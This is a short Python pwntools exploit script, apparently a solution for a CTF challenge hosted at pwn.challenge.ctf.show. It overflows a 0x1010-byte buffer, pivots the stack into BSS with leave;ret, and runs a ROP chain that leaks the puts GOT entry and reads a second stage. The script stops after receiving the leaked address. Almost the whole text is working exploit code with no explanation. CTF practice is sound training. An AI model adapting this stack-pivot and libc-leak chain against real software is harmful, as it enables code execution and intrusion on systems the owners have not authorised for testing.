from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process("./pwn")
#io = remote('127.0.0.1',10000)
io = remote('pwn.challenge.ctf.show',28129)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_a = elf.symbols["puts"]
put_got = elf.got["puts"]
read_a = elf.symbols["read"]
libc_puts = libc.sym['puts']
leave_addr = 0x400ada  
pop_rdi_ret = 0x400be3     # 0x0000000000400be3 : pop rdi ; ret
pop_rsi_r15_ret = 0x400be1 # 0x0000000000400be1 : pop rsi ; pop r15 ; ret
bss_addr = 0x602f00
payload  = 'a' * 0x1010 + p64(bss_addr - 0x8)
payload += p64(pop_rdi_ret) + p64(put_got) + p64(puts_a)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) + p64(read_a)
payload += p64(leave_addr)
payload  = payload.ljust(0x2000,'a')
io.sendlineafter("send:\n",str(0x2000))
sleep(0.5)
io.send(payload)
sleep(0.5)
io.recvuntil("See you next time!\n")
puts = u64(io.recv(6).ljust(8,'\x00'))
